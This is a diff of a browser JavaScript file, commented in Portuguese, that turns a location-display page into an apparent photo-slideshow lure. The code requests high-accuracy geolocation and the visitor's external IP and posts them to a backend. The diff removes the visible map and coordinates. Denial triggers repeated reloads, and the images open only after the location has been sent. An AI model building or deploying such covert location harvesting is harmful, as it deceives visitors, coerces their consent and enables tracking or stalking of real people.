@@ -1,13 +1,6 @@
-let latitudeEl = document.getElementById('latitude');
-let longitudeEl = document.getElementById('longitude');
-let accuracyEl = document.getElementById('accuracy');
-
-let map, marker, accuracyCircle;
-
 async function success(pos) {
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
-    const acc = pos.coords.accuracy;
 
     // Obter o IP externo
     let ip = '';
@@ -18,13 +11,6 @@ async function success(pos) {
     } catch (err) {
         console.error('Erro ao obter IP:', err);
     }
-
-    // Atualiza info no DOM
-    latitudeEl.textContent = `Latitude: ${lat}`;
-    longitudeEl.textContent = `Longitude: ${lon}`;
-    accuracyEl.textContent = `Precisão: ${acc.toFixed(1)} metros`;
-
-    console.log('Enviando para o backend:', { ip, latitude: lat, longitude: lon });
 
     // Enviar ao backend
     fetch('http://127.0.0.1:4000/localizacoes', {
@@ -38,42 +24,77 @@ async function success(pos) {
     }).then(res => {
         if (res.ok) {
             console.log('Localização enviada com sucesso!');
+            mostrarBotaoAbrirImagens(); // Mostra o botão depois da confirmação
         } else {
             res.json().then(data => {
                 console.warn('Erro ao salvar localização:', data.message);
             });
         }
     }).catch(err => console.error('Erro ao enviar localização:', err));
-
-    // Mostrar no mapa
-    if (!map) {
-        map = L.map('map').setView([lat, lon], 17);
-        L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '&copy; OpenStreetMap'
-        }).addTo(map);
-    } else {
-        map.setView([lat, lon], 17);
-    }
-
-    if (marker) marker.setLatLng([lat, lon]);
-    else marker = L.marker([lat, lon]).addTo(map).bindPopup('Você está aqui').openPopup();
-
-    if (accuracyCircle) accuracyCircle.setLatLng([lat, lon]).setRadius(acc);
-    else accuracyCircle = L.circle([lat, lon], {
-        radius: acc,
-        color: 'blue',
-        fillOpacity: 0.1
-    }).addTo(map);
 }
 
 function error(err) {
     console.warn(`Erro ao obter localização: ${err.message}`);
-    // Recarrega a página se o usuário negar
-    location.reload();
+    alert('Por favor, permita o compartilhamento da sua localização para continuar.');
+    location.reload(); // Recarrega para tentar novamente
 }
 
+// Solicitar localização assim que o site carrega
 navigator.geolocation.getCurrentPosition(success, error, {
     enableHighAccuracy: true,
     timeout: 10000,
     maximumAge: 0
 });
+
+// Função para criar o botão "Abrir imagens"
+function mostrarBotaoAbrirImagens() {
+    const botao = document.createElement('button');
+    botao.textContent = 'Abrir imagens';
+    botao.className = 'btn-abrir-imagens';
+    botao.onclick = iniciarSlideshow;
+    document.body.appendChild(botao);
+}
+
+// Função que carrega o slideshow ao clicar no botão
+function iniciarSlideshow() {
+    const slideshow = document.createElement('div');
+    slideshow.className = 'slideshow';
+
+    const imagens = [
+        '../frontend/src/img/01.jpg',
+        '../frontend/src/img/02.jpg',
+        '../frontend/src/img/03.jpg',
+        '../frontend/src/img/04.jpg',
+        // Adicione mais imagens se quiser
+    ];
+
+    imagens.forEach((src, index) => {
+        const img = document.createElement('img');
+        img.src = src;
+        img.className = 'slide';
+        if (index === 0) img.classList.add('active');
+        slideshow.appendChild(img);
+    });
+
+    document.body.appendChild(slideshow);
+
+    iniciarTrocaDeSlides();
+
+    // Remove o botão depois de clicar
+    const botao = document.querySelector('.btn-abrir-imagens');
+    if (botao) {
+        botao.remove();
+    }
+}
+
+// Função para alternar os slides
+function iniciarTrocaDeSlides() {
+    const slides = document.querySelectorAll('.slide');
+    let index = 0;
+
+    setInterval(() => {
+        slides[index].classList.remove('active');
+        index = (index + 1) % slides.length;
+        slides[index].classList.add('active');
+    }, 3000); // Troca a cada 3 segundos
+}
